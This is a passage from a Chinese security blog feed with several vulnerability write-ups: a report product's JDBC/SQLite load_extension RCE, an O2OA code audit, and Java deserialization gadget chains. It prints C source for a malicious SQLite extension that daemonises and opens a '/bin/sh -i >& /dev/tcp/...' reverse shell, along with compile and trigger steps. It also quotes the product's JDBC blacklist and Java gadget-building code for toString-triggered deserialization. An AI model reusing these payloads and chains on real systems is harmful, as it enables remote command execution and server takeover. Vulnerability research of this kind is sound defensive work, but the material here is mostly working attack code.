class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sqlite3ext.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br>SQLITE_EXTENSION_INIT1<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN32</span><br>__declspec(dllexport)<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Initializes the SQLite extension.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @param db SQLite database pointer</span><br><span class="hljs-comment"> * @param pzErrMsg Error message pointer</span><br><span class="hljs-comment"> * @param pApi SQLite API routines pointer</span><br><span class="hljs-comment"> * @return SQLITE_OK on success</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sqlite3_extension_init</span><span class="hljs-params">(</span><br><span class="hljs-params">    sqlite3 *db,</span><br><span class="hljs-params">    <span class="hljs-type">char</span> **pzErrMsg,</span><br><span class="hljs-params">    <span class="hljs-type">const</span> sqlite3_api_routines *pApi</span><br><span class="hljs-params">)</span> &#123;<br>    <span class="hljs-type">int</span> rc = SQLITE_OK;<br>    SQLITE_EXTENSION_INIT2(pApi);<br><br>    <span class="hljs-type">pid_t</span> pid = fork();<br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;fork error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// 父进程继续执行</span><br>        <span class="hljs-comment">// 可以在此处添加额外的代码逻辑</span><br>        <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-comment">// 父进程持续执行其他任务</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 子进程继续执行</span><br>    umask(<span class="hljs-number">0</span>); <span class="hljs-comment">// 设置文件权限掩码</span><br><br>    <span class="hljs-comment">// 创建新会话，并成为会话组组长</span><br>    <span class="hljs-keyword">if</span> (setsid() &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;setsid error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// 关闭标准输入、输出、错误输出</span><br>    close(STDIN_FILENO);<br>    close(STDOUT_FILENO);<br>    close(STDERR_FILENO);<br><br>    <span class="hljs-comment">// 打开一个新的文件描述符作为标准输入、输出、错误输出</span><br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/null&quot;</span>, O_RDWR); <span class="hljs-comment">// 或者使用其他文件路径</span><br>    dup2(fd, STDIN_FILENO);<br>    dup2(fd, STDOUT_FILENO);<br>    dup2(fd, STDERR_FILENO);<br>    close(fd);<br><br>    <span class="hljs-comment">// 执行需要在后台运行的代码</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *args[] = &#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;/bin/sh -i &gt;&amp; /dev/tcp/127.0.0.1/8888 0&gt;&amp;1&quot;</span>, <span class="hljs-literal">NULL</span>&#125;;<br>    execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, (<span class="hljs-type">char</span>* <span class="hljs-type">const</span>*)args, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> rc;<br>&#125;<br></code></pre></td></tr></table></figure><p>填写好接收反弹shell的地址。</p><p>使用gcc编译成恶意的动态链接库。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-comment">//Mac       gcc -fPIC -dynamiclib -o poc1.dylib poc.c</span><br><span class="hljs-comment">//linux     gcc -fPIC -shared  -o liboutput.so poc.c</span><br></code></pre></td></tr></table></figure><p>然后修改成</p><p>然后在<strong>校验语句</strong>这里输入语句执行我们恶意动态库文件**SELECT load_extension(‘poc.dylib’)**； 修改为dylic的路径。</p><p>执行后nc接收到shell。</p><p><img src="image-20240614022922220.png" alt="image-20240614022922220"></p><h3 id="0x03-代码分析"><a href="#0x03-代码分析" class="headerlink" title="0x03 代码分析"></a>0x03 代码分析</h3><p>与finereport有点不同，</p><p>com.fr.decision.webservice.v10.datasource.connection.ConnectionService.getDriverPath</p><p><img src="image-20240614024201059.png" alt="image-20240614024201059"></p><p>在这里接受我们传入的jdbc连接</p><p>om.fr.decision.webservice.v10.datasource.connection.processor.impl.ConnectionProcessorFactory.getDriverPath</p><p><img src="image-20240614024335360.png" alt="image-20240614024335360"></p><p>com.fr.decision.webservice.v10.datasource.connection.processor.impl.JDBCConnectionProcessor.convertToJDBCConnectio</p><p><img src="image-20240614024718057.png" alt="image-20240614024718057"></p><p>一系列调用后来看这里，完成jdbc链接的赋值，最后调用validateSettings进行检查</p><p>com.fr.decision.webservice.v10.datasource.connection.processor.impl.JDBCConnectionProcessor.validateSettings</p><p><img src="image-20240614025114552.png" alt="image-20240614025114552"></p><p>这里会反射获取数据库服务，然后调用 JDBCSecurityChecker.checkUr进行检查。</p><p>com.fr.data.core.db.JDBCSecurityChecker#check</p><p><img src="image-20240614025435321.png" alt="image-20240614025435321"></p><p>然后在黑名单进行匹配。</p><p><img src="image-20240614025745936.png" alt="image-20240614025745936"></p><p>对应的黑名单</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"> <br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> InsecurityElement[] FORBIDDEN_ELEMENTS_OF_URL = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityElement</span>[] &#123; <br>    (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;INIT=&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;allowLoadLocalInfile=&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;autoDeserialize=&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;clientRerouteServerListJNDIName=&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;jcr:jndi:&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;slaveHost=&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;sqlite::resource&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;mysql:fabric&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;socketFactory=&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;loggerFile=&quot;</span>), <br>    (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;TRIGGER&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;java.lang.ProcessImpl&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLResource</span>() &#125;;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> InsecurityElement[] FORBIDDEN_ELEMENTS_OF_VALIDATION_QUERY = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityElement</span>[] &#123; (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecuritySQLKeyword</span>(<span class="hljs-string">&quot;create&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecuritySQLKeyword</span>(<span class="hljs-string">&quot;drop&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecuritySQLKeyword</span>(<span class="hljs-string">&quot;alter&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecuritySQLKeyword</span>(<span class="hljs-string">&quot;insert&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecuritySQLKeyword</span>(<span class="hljs-string">&quot;delete&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecuritySQLKeyword</span>(<span class="hljs-string">&quot;merge&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecuritySQLKeyword</span>(<span class="hljs-string">&quot;attach&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecuritySQLKeyword</span>(<span class="hljs-string">&quot;benchmark&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecuritySQLKeyword</span>(<span class="hljs-string">&quot;xp_dirtree&quot;</span>) &#125;;<br><br></code></pre></td></tr></table></figure><p>可以看到<strong>enable_load_extension&#x3D;true</strong> 不在黑名单中，最后找成了执行恶意动态库。</p><p>过于复杂，推荐前端复现。</p><h3 id="0x04-修复"><a href="#0x04-修复" class="headerlink" title="0x04 修复"></a>0x04 修复</h3><p>​等待官网修复，截止报告提交时间2024年6月14日，通杀所有版本。 截止8.4日，最新版已修复</p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>o2oa审计</title>
    <link href="/2024/08/04/o2oa%E5%AE%A1%E8%AE%A1/"/>
    <url>/2024/08/04/o2oa%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<p>纯代码层面分析，可能存在的问题，未复现</p><h3 id="0x01-反序列化"><a href="#0x01-反序列化" class="headerlink" title="0x01 反序列化"></a>0x01 反序列化</h3><p>com.x.base.core.project.cache.CacheRedisImpl#get</p><p><img src="image-20240731125419849.png" alt="image-20240731125419849"></p><p>从redis获取key对应的value转换成byte流，然后进行反序列化</p><p>调用</p><p>com.x.base.core.project.cache.CacheManager#get</p><p><img src="image-20240731125519025.png" alt="image-20240731125519025"></p><p>网上很容易就能找到对应的control，太多了</p><p><img src="image-20240731125725462.png" alt="image-20240731125725462"></p><p><img src="image-20240804234949074.png" alt="image-20240804234949074"></p><p>开放java.lang包。懂得都懂</p><h3 id="0x02-命令执行"><a href="#0x02-命令执行" class="headerlink" title="0x02 命令执行"></a>0x02 命令执行</h3><p>com.x.program.center.jaxrs.command.CommandAction#executeCommand</p><p><img src="image-20240731163632157.png" alt="image-20240731163632157"></p><p>直接冲json里面获取命令</p><p><img src="image-20240731163738854.png" alt="image-20240731163738854"></p><p><img src="image-20240731163754328.png" alt="image-20240731163754328"></p><p><img src="image-20240731163839832.png" alt="image-20240731163839832"></p><p>ctl是命令，先获取服务，在执行</p><h3 id="0x03-部署war包"><a href="#0x03-部署war包" class="headerlink" title="0x03 部署war包"></a>0x03 部署war包</h3><p>com.x.program.center.jaxrs.command.CommandAction#upload</p><p><img src="image-20240731163919011.png" alt="image-20240731163919011"></p><p>可以直接部署 恶意的war包</p><p>自己写一个命令执行就行</p><p><a href="https://novysodope.github.io/2021/12/22/70/">https://novysodope.github.io/2021/12/22/70/</a></p><h3 id="0x04-创建接口rce"><a href="#0x04-创建接口rce" class="headerlink" title="0x04  创建接口rce"></a>0x04  创建接口rce</h3><p><img src="image-20240731164243158.png" alt="image-20240731164243158"></p><p>class不在黑名单，可反射获取任意类任意方法</p><p><a href="https://github.com/user-attachments/files/15552539/O2OA.system.has.Remote.Command.Execution.Vulnerability.pdf">https://github.com/user-attachments/files/15552539/O2OA.system.has.Remote.Command.Execution.Vulnerability.pdf</a></p><p>参考</p><h3 id="0x05-可读配置文件"><a href="#0x05-可读配置文件" class="headerlink" title="0x05 可读配置文件"></a>0x05 可读配置文件</h3><p>com.x.program.center.jaxrs.config.ConfigAction#open</p><p><img src="image-20240731164532171.png" alt="image-20240731164532171"></p><p><img src="image-20240731164619244.png" alt="image-20240731164619244"></p><p>可以直接从json获取file文件名</p><p><img src="image-20240731164646288.png" alt="image-20240731164646288"></p><p><img src="image-20240731164715818.png" alt="image-20240731164715818"></p><p>这里过滤了，获取到的file不等于node，且在文件名在confid下就可以读。</p><p><img src="image-20240731164801632.png" alt="image-20240731164801632"></p><p>可读项</p><h4 id="0x06-任意文件写"><a href="#0x06-任意文件写" class="headerlink" title="0x06 任意文件写"></a>0x06 任意文件写</h4><p>com.x.program.center.jaxrs.config.ConfigAction#save</p><p><img src="image-20240731165004980.png" alt="image-20240731165004980"></p><p><img src="image-20240731165108607.png" alt="image-20240731165108607"></p><p><img src="image-20240731165155443.png" alt="image-20240731165155443"></p><p>也就是通过StringTools.isFileName这个函数判断了 只能修改config下的文件。</p><p><img src="image-20240731165256615.png" alt="image-20240731165256615"></p><p>从json读入字节流然后写入，也就是我可以先读到general.json的配置，然后把黑名单删除掉，然后在打 <strong>0x03创建接口的rce</strong>.</p><p>这样看 最新版也受影响。</p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/07/06/hessian_tostring/"/>
    <url>/2024/07/06/hessian_tostring/</url>
    
    <content type="html"><![CDATA[<h3 id="0x01-TreeMap-的-四条触发tosting"><a href="#0x01-TreeMap-的-四条触发tosting" class="headerlink" title="0x01  TreeMap 的 四条触发tosting"></a>0x01  TreeMap 的 四条触发tosting</h3><p>核心就是利用javax.naming.ldap.Rdn.RdnEntry#compareTo去触发<strong>obj1.equals(obj2)</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-type">Object</span> <span class="hljs-variable">xstring</span> <span class="hljs-operator">=</span> utils.createWithoutConstructor(<span class="hljs-string">&quot;com.sun.org.apache.xpath.internal.objects.XStringForFSB&quot;</span>);<br><span class="hljs-comment">//        Object xstring = createWithoutConstructor(&quot;com.sun.org.apache.xpath.internal.objects.XString&quot;);</span><br>        utils.setFieldValue(xstring, <span class="hljs-string">&quot;m_obj&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>);<br><span class="hljs-comment">//       Object xstring = utils.createWithoutConstructor(&quot;javax.sound.sampled.AudioFileFormat.Type&quot;);</span><br><span class="hljs-comment">//       Object xstring = utils.createWithoutConstructor(&quot;javax.sound.sampled.AudioFormat$Encoding&quot;);</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">rdnEntry1</span> <span class="hljs-operator">=</span> utils.createWithoutConstructor(<span class="hljs-string">&quot;javax.naming.ldap.Rdn$RdnEntry&quot;</span>);<br>        utils.setFieldValue(rdnEntry1, <span class="hljs-string">&quot;type&quot;</span>, <span class="hljs-string">&quot;ysomap&quot;</span>);<br>        utils.setFieldValue(rdnEntry1, <span class="hljs-string">&quot;value&quot;</span>, objects1);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">rdnEntry2</span> <span class="hljs-operator">=</span> utils.createWithoutConstructor(<span class="hljs-string">&quot;javax.naming.ldap.Rdn$RdnEntry&quot;</span>);<br>        utils.setFieldValue(rdnEntry2, <span class="hljs-string">&quot;type&quot;</span>, <span class="hljs-string">&quot;ysomap&quot;</span>);<br>        utils.setFieldValue(rdnEntry2, <span class="hljs-string">&quot;value&quot;</span>, xstring);<br>        <span class="hljs-type">TreeSet</span> <span class="hljs-variable">treeSet</span> <span class="hljs-operator">=</span> makeTreeSet(rdnEntry1, rdnEntry2);<br><br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> TreeSet <span class="hljs-title function_">makeTreeSet</span><span class="hljs-params">(Object v1, Object v2)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>            TreeMap&lt;Object,Object&gt; m = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeMap</span>&lt;&gt;();<br>            utils.setFieldValue(m, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>            utils.setFieldValue(m, <span class="hljs-string">&quot;modCount&quot;</span>, <span class="hljs-number">2</span>);<br>            Class&lt;?&gt; nodeC = Class.forName(<span class="hljs-string">&quot;java.util.TreeMap$Entry&quot;</span>);<br>            <span class="hljs-type">Constructor</span> <span class="hljs-variable">nodeCons</span> <span class="hljs-operator">=</span> nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);<br>            nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> nodeCons.newInstance(v1, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>], <span class="hljs-literal">null</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">right</span> <span class="hljs-operator">=</span> nodeCons.newInstance(v2, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>], node);<br>            utils. setFieldValue(node, <span class="hljs-string">&quot;right&quot;</span>, right);<br>            utils.setFieldValue(m, <span class="hljs-string">&quot;root&quot;</span>, node);<br><br>            <span class="hljs-type">TreeSet</span> <span class="hljs-variable">set</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeSet</span>();<br>            utils.setFieldValue(set, <span class="hljs-string">&quot;m&quot;</span>, m);<br>            <span class="hljs-keyword">return</span> set;<br>        &#125;<br></code></pre></td></tr></table></figure><p>javax.naming.ldap.Rdn.RdnEntry#compareTo</p><p><img src="image-20240706124044436.png" alt="image-20240706124044436"></p><p>可以控制vaule，也就是可以控制 <strong>obj1.equals(obj2)</strong></p><p>使用tabby查询只调用一次的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">MATCH path = (n:Method &#123;NAME: &quot;equals&quot;&#125;)-[:CALL]-&gt;(:Method &#123;NAME0:&quot;java.lang.Object#toString&quot;&#125;) where none(n in nodes(path) where n.CLASSNAME CONTAINS &quot;com.fr&quot;)<br>RETURN path <br></code></pre></td></tr></table></figure><p><img src="image-20240706131137683.png" alt="image-20240706131137683"></p><p>排除错误不能的后</p><p><img src="image-20240706131217240.png" alt="image-20240706131217240"></p><p>分别就是上面的几个类</p><p><strong>CLASSNAME: javax.sound.sampled.AudioFormat$Encoding</strong></p><p><strong>CLASSNAME: com.sun.org.apache.xpath.internal.objects.XStringForFSB</strong></p><p><strong>CLASSNAME: com.sun.org.apache.xpath.internal.objects.XString</strong></p><p><strong>CLASSNAME: javax.sound.sampled.AudioFileFormat$Type</strong></p><p>哎，只要放以前就是4条cve</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>finechanneljdbc工具说明</title>
    <link href="/2024/06/23/finechanneljdbc%E5%B7%A5%E5%85%B7%E8%AF%B4%E6%98%8E/"/>
    <url>/2024/06/23/finechanneljdbc%E5%B7%A5%E5%85%B7%E8%AF%B4%E6%98%8E/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="6ee29cbea345a17f86f1cb178868814ccd2fc21829c9740607408e8e46b9494e"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>漏洞工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>某报表最新反序列漏洞</title>
    <link href="/2024/06/23/%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%9C%80%E6%96%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/"/>
    <url>/2024/06/23/%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%9C%80%E6%96%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-起因"><a href="#0x01-起因" class="headerlink" title="0x01 起因"></a>0x01 起因</h2><p>​某次护网应急响应，发现了最新版的某报表的被打掉了，日记记录也是channel触发的反序列化，和<strong>springkill</strong>大哥一起愉快调试两天了，想着已经玩了一个多月，差不多见光死了，就和大家分享下得了。</p><h2 id="0x02-历史漏洞"><a href="#0x02-历史漏洞" class="headerlink" title="0x02 历史漏洞"></a>0x02 历史漏洞</h2><p>​某报表channel反序列化漏洞历史爆出三个链子，一个cb，一个singobject的二次反序列，一个Hibernate。下载最新版v10，查找黑名单</p><p>com&#x2F;fr&#x2F;serialization&#x2F;blacklist.txt</p><p><img src="image-20240521115946806.png" alt="image-20240521115946806"></p><p><img src="image-20240521120104198.png" alt="image-20240521120104198"></p><p><img src="image-20240521120121246.png" alt="image-20240521120121246"></p><p>可以看见最新版v10，这几个类已经在黑名单里面了。所以很明确，就是找一条新的gadget。</p><h2 id="0x03-com-fr-third-alibaba-druid-pool-xa-DruidXADataSource"><a href="#0x03-com-fr-third-alibaba-druid-pool-xa-DruidXADataSource" class="headerlink" title="0x03 com.fr.third.alibaba.druid.pool.xa.DruidXADataSource"></a>0x03 com.fr.third.alibaba.druid.pool.xa.DruidXADataSource</h2><p>这边直接去找getter触发，找DruidXADataSource这个类非常合适，且不在黑名单里面。</p><p>这个类可以控制sql库的服务，链接url，以及查询语句，很容易就能想到利用druid去打jdbc。</p><p><img src="image-20240521120950769.png" alt="image-20240521120950769"></p><p>可以看见没啥毛病。</p><p><img src="image-20240521121803140.png" alt="image-20240521121803140"></p><p>既然打jbdc，就很多都能打了，实战中还得看服务器存在哪些数据库依赖。</p><p>可以参考su18的 <a href="https://su18.org/post/jdbc-connection-url-attack/%E3%80%82">https://su18.org/post/jdbc-connection-url-attack/。</a></p><p>既然要用getter去触发，也不在黑名单里面，这样找找，发现fastjson，jackson的原生序列化就很合适。</p><h2 id="0x04-com-fr-json-JSONArray-toString"><a href="#0x04-com-fr-json-JSONArray-toString" class="headerlink" title="0x04 com.fr.json.JSONArray#toString"></a>0x04 com.fr.json.JSONArray#toString</h2><p><img src="image-20240521141836696.png" alt="image-20240521141836696"></p><p><img src="image-20240521141851143.png" alt="image-20240521141851143"></p><p><img src="image-20240521142513801.png" alt="image-20240521142513801"></p><p><img src="image-20240521141900829.png" alt="image-20240521141900829"></p><p>在这个类的tostring，会调用到</p><p>com.fr.json.revise.EmbedJson#encode</p><p><img src="image-20240521142007752.png" alt="image-20240521142007752"></p><p>它里面会调用jackson的序列化，list直接反射修改为druid，从而触发druid的getXAConnection()。也就是只用了om.fr.json.JSONArray然后内部调用，直接就绕过jackson的黑名单太酷了。</p><p><img src="image-20240521142953349.png" alt="image-20240521142953349"></p><h2 id="0x05-两条jdk原生tostring"><a href="#0x05-两条jdk原生tostring" class="headerlink" title="0x05 两条jdk原生tostring"></a>0x05 两条jdk原生tostring</h2><p>​现在公开触发tostring的头部基本都在黑名单了。</p><p><img src="image-20240521154059131.png" alt="image-20240521154059131"></p><p><img src="image-20240521154800842.png" alt="image-20240521154800842"></p><p><img src="image-20240521155051871.png" alt="image-20240521155051871"></p><p><img src="image-20240521160510061.png" alt="image-20240521160510061"></p><p>所以现在需要找一条新的tostring。</p><p>javax.swing.UIDefaults.TextAndMnemonicHashMap</p><p><img src="image-20240521204318067.png" alt="image-20240521204318067"></p><p>可以看到是map,然后调用了key的tostring，非常完美。</p><p>java.util.AbstractMap#equals</p><p><img src="image-20240521204924499.png" alt="image-20240521204924499"></p><p>m是一个map，改成javax.swing.UIDefaults.TextAndMnemonicHashMap就可以走通，非常合理，java.util.AbstractMap是一个抽象类，所以我们只要找一个继承它又没有实现equals的方法就行了,感觉非常多了，haspmap，hashtable都可以。</p><h4 id="hashtable触发tostring"><a href="#hashtable触发tostring" class="headerlink" title="hashtable触发tostring"></a>hashtable触发tostring</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Hashtable <span class="hljs-title function_">makeTableTstring</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">tHashMap1</span> <span class="hljs-operator">=</span> (Map) createWithoutConstructor(<span class="hljs-string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">tHashMap2</span> <span class="hljs-operator">=</span> (Map) createWithoutConstructor(<span class="hljs-string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>);<br>    tHashMap1.put(o,<span class="hljs-string">&quot;yy&quot;</span>);<br>    tHashMap2.put(o,<span class="hljs-string">&quot;zZ&quot;</span>);<br>    setFieldValue(tHashMap1,<span class="hljs-string">&quot;loadFactor&quot;</span>,<span class="hljs-number">1</span>);<br>    setFieldValue(tHashMap2,<span class="hljs-string">&quot;loadFactor&quot;</span>,<span class="hljs-number">1</span>);<br><br>    <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>    hashtable.put(tHashMap1,<span class="hljs-number">1</span>);<br>    hashtable.put(tHashMap2,<span class="hljs-number">1</span>);<br><br>    tHashMap1.put(o, <span class="hljs-literal">null</span>);<br>    tHashMap2.put(o, <span 